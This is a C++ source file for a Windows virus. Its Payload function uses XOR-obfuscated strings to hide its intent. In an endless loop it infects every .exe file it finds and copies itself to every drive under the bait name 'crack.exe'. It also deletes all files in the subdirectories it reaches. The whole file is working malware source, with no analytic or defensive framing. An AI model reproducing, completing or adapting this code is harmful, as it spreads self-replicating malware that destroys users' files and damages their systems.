#include "data_globals.h"
#include <windows.h>
#include <cstring>
#pragma optimize("", off)

template<typename T>
static const char* to_const_char(const volatile T* p) {
    return reinterpret_cast<const char*>(const_cast<const T*>(p));
}

static void xor_decrypt(volatile unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

void Payload(void)
{
    WIN32_FIND_DATAA findDataExe;
    WIN32_FIND_DATAA findDataDir;
    WIN32_FIND_DATAA findDataSub;
    char drivePath[42] = {};
    char tempPath[16] = {};
    char baseDir[160] = {};
    char searchPattern[16] = {};
    char dirCopy[16] = {};
    HANDLE hFindExe = INVALID_HANDLE_VALUE;
    HANDLE hFindDir = INVALID_HANDLE_VALUE;
    HANDLE hFindSub = INVALID_HANDLE_VALUE;
    char* driveIter = nullptr;
    size_t driveLen = 0;

    volatile unsigned char sz_crack_exe[] = { 'c'^0x2A, 'r'^0x2A, 'a'^0x2A, 'c'^0x2A, 'k'^0x2A, '.'^0x2A, 'e'^0x2A, 'x'^0x2A, 'e'^0x2A, 0x00^0x2A };
    xor_decrypt(sz_crack_exe, sizeof(sz_crack_exe), 0x2A);
    strncpy(drivePath, to_const_char(sz_crack_exe), 10);

    do {
        Sleep(5000);

        volatile unsigned char sz_exe[] = { '*'^0x4B, '.'^0x4B, 'e'^0x4B, 'x'^0x4B, 'e'^0x4B, 0x00^0x4B };
        xor_decrypt(sz_exe, sizeof(sz_exe), 0x4B);
        hFindExe = FindFirstFileA(to_const_char(sz_exe), &findDataExe);
        if (hFindExe != INVALID_HANDLE_VALUE) {
            do {
                Infect(findDataExe.cFileName, VBuffer);
            } while (FindNextFileA(hFindExe, &findDataExe));
            FindClose(hFindExe);
        }

        GetLogicalDriveStringsA(0x400, Drives);
        for (driveIter = Drives; *driveIter != '\0'; driveIter += driveLen + 1) {
            strcpy(drivePath + 10, driveIter);
            strcat(drivePath + 10, drivePath);
            CopyFileA(Virus, drivePath + 10, 0);
            driveLen = strlen(driveIter);
        }

        volatile unsigned char sz_dot[] = { '*'^0x7D, '.'^0x7D, 0x00^0x7D };
        xor_decrypt(sz_dot, sizeof(sz_dot), 0x7D);
        hFindDir = FindFirstFileA(to_const_char(sz_dot), &findDataDir);
        if (hFindDir != INVALID_HANDLE_VALUE) {
            do {
                if (findDataDir.dwFileAttributes == 0x10) {
                    strcpy(tempPath, baseDir);
                    strcat(tempPath, findDataDir.cFileName);
                    strcpy(searchPattern, tempPath);
                    strcpy(dirCopy, tempPath);
                    driveLen = strlen(searchPattern);
                    volatile unsigned char sz_slash_star_dot_star[] = { '\\'^0x1C, '*'^0x1C, '.'^0x1C, '*'^0x1C, 0x00^0x1C };
                    xor_decrypt(sz_slash_star_dot_star, sizeof(sz_slash_star_dot_star), 0x1C);
                    strncpy(searchPattern + driveLen, to_const_char(sz_slash_star_dot_star), 5);
                    hFindSub = FindFirstFileA(searchPattern, &findDataSub);
                    if (hFindSub != INVALID_HANDLE_VALUE) {
                        do {
                            strcpy(tempPath, dirCopy);
                            driveLen = strlen(tempPath);
                            tempPath[driveLen] = '\\';
                            tempPath[driveLen + 1] = '\0';
                            strcat(tempPath, findDataSub.cFileName);
                            DeleteFileA(tempPath);
                        } while (FindNextFileA(hFindSub, &findDataSub));
                        FindClose(hFindSub);
                    }
                }
            } while (FindNextFileA(hFindDir, &findDataDir));
            FindClose(hFindDir);
        }
    } while (true);
}
#pragma optimize("", on)
